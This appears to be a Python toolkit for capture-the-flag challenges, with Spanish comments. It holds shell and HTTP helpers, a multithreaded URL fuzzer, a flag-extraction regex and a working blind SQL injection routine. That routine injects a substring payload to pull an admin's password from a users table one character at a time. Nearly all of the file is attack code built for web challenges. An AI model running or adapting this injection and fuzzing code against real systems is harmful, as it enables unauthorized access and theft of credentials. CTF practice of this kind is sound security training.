#!/usr/bin/env python3
import re
import subprocess
import requests
from concurrent.futures import ThreadPoolExecutor

def sys_run(command):
    """Ejecuta comandos del shell del sistema de forma limpia."""
    try:
        res = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
        return {"stdout": res.stdout.strip(), "stderr": res.stderr.strip(), "code": res.returncode}
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "code": -1}

def web_post(url, data_dict, headers_dict=None, json_mode=False):
    """Peticiones POST con inyección flexible de Headers."""
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0"}
    if headers_dict: headers.update(headers_dict)
    try:
        if json_mode: return requests.post(url, json=data_dict, headers=headers, timeout=5)
        return requests.post(url, data=data_dict, headers=headers, timeout=5)
    except Exception as e: return None

def web_get(url, params_dict=None, headers_dict=None):
    """Peticiones GET limpias para interactuar con APIs o endpoints web."""
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Firefox/115.0"}
    if headers_dict: headers.update(headers_dict)
    try: return requests.get(url, params=params_dict, headers=headers, timeout=5)
    except Exception as e: return None

def web_concurrent_fuzz(url, wordlist, max_threads=20, success_indicator="FLAG{"):
    """Fuzzer concurrente multihilo. Reemplaza la cadena 'FUZZ' en la URL."""
    def _worker(payload):
        try:
            r = requests.get(url.replace("FUZZ", payload), timeout=3)
            if success_indicator in r.text: return payload
        except: pass
        return None

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        results = executor.map(_worker, wordlist)
        for r in results:
            if r: return r
    return None

def extract_flag(text, pattern=r"(flag\{.*?\})"):
    """Busca y extrae expresiones regulares (flags) de respuestas HTTP densas."""
    match = re.search(pattern, text, re.IGNORECASE)
    return match.group(1) if match else None

def blind_sqli_extractor(target_url, alphabet="abcdefghijklmnopqrstuvwxyz0123456789_}"):
    """
    Estructura lógica base para extraer datos caracter por caracter en Blind SQL Injection.
    Modifica el payload según la sintaxis del motor del reto (MySQL, SQLite, PostgreSQL).
    """
    flag = "flag{"
    print("[*] Iniciando extracción vía Blind SQLi...")
    for position in range(len(flag) + 1, 50):
        found = False
        for char in alphabet:
            # Payload de ejemplo (Modificar la condición lógica según el laboratorio)
            payload = f"' anD (select substr(password,{position},1) from users where username='admin')='{char}"
            r = web_get(target_url, params_dict={"id": payload})
            
            # Condición de éxito basada en la respuesta (True Condition)
            if r and "Welcome" in r.text:
                flag += char
                print(f"[+] Progreso actual: {flag}")
                found = True
                break
        if not found or char == "}": break
    return flag
